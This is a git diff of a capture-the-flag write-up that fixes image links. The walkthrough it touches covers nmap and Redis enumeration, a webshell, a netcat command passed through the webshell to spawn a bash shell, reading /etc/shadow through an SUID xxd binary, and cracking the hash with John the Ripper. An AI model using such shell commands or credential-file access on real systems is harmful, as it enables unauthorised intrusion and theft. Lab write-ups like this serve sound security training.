@@ -17,7 +17,7 @@ Nmap scan to find out the open ports and services
 
 ```nmap -sV  -sC -p- 10.10.131.41```
 
-[Nmap screenshot](images/nmap_scan)
+[Nmap screenshot](/images/nmap_scan.png)
 
 From the results we see that we have an Apache web server running on port 80 and Redis 6.0.7  on port 6379.
 
@@ -27,11 +27,11 @@ From the results we see that we have an Apache web server running on port 80 and
 
 Visiting the web application on http://10.10.131.41:80, displayed a standard Apache landing page. Nothing was revealed by examining the source code
 
-[Web Application on Port 80](/images/web_application)
+[Web Application on Port 80](/images/web_application.png)
 
 Next I ran a directory scan using Dirbuster to look for any hidden directories or files. but no hidden directories was found.
 
-[web directory enumeration screenshot](/images/dirbuster)
+[web directory enumeration screenshot](/images/dirbuster.png)
 
 Moving on to next open port 6379 and enumerating the Redis service.
 
@@ -45,34 +45,34 @@ To access Redis on 10.10.131.41, I installed redis-tools on my kali machine
 
 ```sudo apt-get install redis-tools```
 
-[redis_tools installation screenshot](/images/redis_tools)
+[redis_tools installation screenshot](/images/redis_tools.png)
 
-[redis connect screenshot](/images/connect_redis)
+[redis connect screenshot](/images/connect_redis.png)
 
-[redis info screenshot](/images/info_redis)
+[redis info screenshot](/images/info_redis.png)
 
 Checking the webpage, I found that it works.
 
-[Webshell execution screenshot](/images/webshell_execution)
+[Webshell execution screenshot](/images/webshell_execution.png)
 
 Make a netcat connection to the attacker IP
 
 ```10.10.131.41/shell.php?c=nc -e /bin/bash -lnvp 8888```
 
-[access screenshot](/images/user)
+[access screenshot](/images/user.png)
 
 ###Privilage Escalation
-[suid screenshot](/images/xxd_0)
-[xxd screenshot](/images/xxd)
+[suid screenshot](/images/xxd_0.png)
+[xxd screenshot](/images/xxd.png)
 
 local user password hash from /etc/shadow file
-[password hash screenshot](/images/shadow)
+[password hash screenshot](/images/shadow.png)
 
 John the ripper to crack the password
-[password cracked screenshot](/images/john)
+[password cracked screenshot](/images/john.png)
 
 Root access
-[sudo screenshot](/images/root_access)
+[sudo screenshot](/images/root_access.png)
 
 
 
